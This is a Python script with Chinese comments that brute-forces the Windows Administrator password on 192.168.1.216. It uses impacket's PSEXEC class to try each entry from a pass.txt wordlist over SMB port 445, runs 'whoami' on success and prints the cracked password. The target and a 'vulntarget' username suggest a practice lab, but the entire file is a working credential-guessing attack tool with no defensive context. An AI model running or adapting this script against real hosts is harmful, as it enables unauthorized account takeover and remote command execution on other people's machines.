# 调用 psexec.py, 使用 pass.txt 中的密码暴力破解 192.168.1.216 的 Administrator 的密码
from psexec import PSEXEC
from pathlib import Path
from typing import List


def brute(ip: str, passwd_list: List, username: str = "Administrator"):
    """
    使用指定密码列表利用 psexec.py 暴破指定 ip 指定用户的密码
    """
    # 计数器
    count = 0
    length = len(passwd_list)
    for password in passwd_list:
        try:
            psexec = PSEXEC(
                aesKey=None,
                command="whoami",
                copyFile=None,
                doKerberos=False,
                domain="",
                exeFile=None,
                kdcHost=None,
                password=password,
                path=None,
                port=445,
                remoteBinaryName=None,
                serviceName="",
                username=username,
            )
            remote_ip = ip
            psexec.run(remoteHost=remote_ip, remoteName=remote_ip)
        except Exception as e:
            # print(e)
            count += 1
            # 打印进度
            print(f"[*] {count}/{length}", end="\r")
            continue
        else:
            print(f"[*] Password is {password}")
            break


def main():
    ip = "192.168.1.216"
    username = "vulntarget"
    PASS_FILE_PATH = Path(__file__).parent / "pass.txt"

    password_list = []
    with open(PASS_FILE_PATH, "r") as f:
        for line in f:
            password = line.strip()
            password_list.append(password)

    # brute(ip=ip,passwd_list=password_list,username=username)
    brute(ip=ip, passwd_list=password_list)
    # brute("192.168.1.216", passwd_list="Win10Pro")


if __name__ == "__main__":
    main()
